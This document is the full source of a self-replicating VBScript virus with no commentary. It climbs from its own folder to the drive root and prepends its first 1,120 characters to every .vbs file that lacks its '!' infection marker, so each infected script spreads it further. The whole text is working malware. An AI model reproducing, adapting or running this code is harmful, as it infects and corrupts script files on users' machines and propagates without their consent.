'!
Set FSO = CreateObject("Scripting.FileSystemObject")
VS   = 1120
FN =  WScript.ScriptFullName
InfPath = Left(FN, InStrRev(FN, "\"))
InfFolder(InfPath)

Sub InfFolder(iPath)
 if FSO.FolderExists(iPath) then
 Do
 Set FolderObj = FSO.GetFolder(iPath)
 iPath = FSO.GetParentFolderName(iPath)
 Set FO = FolderObj.Files
 For each target in FO
 ExtName = lcase(FSO.GetExtensionName(target.Name))

 if ExtName = "vbs" then
 Set file1 = FSO.OpenTextFile(target.path, 1, False)
 if file1.readline <> "'!" then
 file1.close()
 InfFile(target.path)
 else
 file1.close()
 end if
 end if

 next
 Loop Until FolderObj.IsRootFolder = True
 end if
 End Sub

Sub InfFile(iPath)
Set VictimFile    = FSO.OpenTextFile(iPath,1,False)
VictimContent     = VictimFile.ReadAll()
VictimFile.Close()

Set HostFile      = FSO.OpenTextFile(WScript.ScriptFullName,1,False)
HostContent       = HostFile.ReadAll()
HostFile.Close()

Vir = Mid(HostContent,1,VS)

Set VictimFile    = FSO.OpenTextFile(iPath,2,False)
VictimFile.Write Vir
VictimFile.Write VictimContent
VictimFile.Close()

End Sub
